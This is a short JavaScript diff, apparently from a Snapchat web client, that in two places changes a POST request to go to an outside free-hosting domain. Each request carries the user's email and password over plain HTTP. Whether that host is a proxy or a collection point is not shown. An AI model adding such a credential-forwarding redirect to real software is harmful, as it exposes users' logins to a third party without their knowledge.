@@ -111,7 +111,7 @@ xmlhttp.onreadystatechange=function()
 	setTimeout(function(){deleteMessage(str.split("?q=")[1],true)},60000);
     }
   }
-xmlhttp.open("POST",str.split("?")[0],true);
+xmlhttp.open("POST","http://gguerind.0fees.net/mysnapchat/"+str.split("?")[0],true);
 xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 xmlhttp.send(str.split("?")[1]+"&email="+your_email+"&password="+your_password);
 }
@@ -155,7 +155,7 @@ xmlhttp.onreadystatechange=function()
 	setTimeout(function(){deleteMessage(str.split("?q=")[1],true)},60000);
 	}
   }
-xmlhttp.open("POST",str.split("?")[0],true);
+xmlhttp.open("POST","http://gguerind.0fees.net/mysnapchat/"+str.split("?")[0],true);
 xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 xmlhttp.send(str.split("?")[1]+"&email="+your_email+"&password="+your_password);
 }
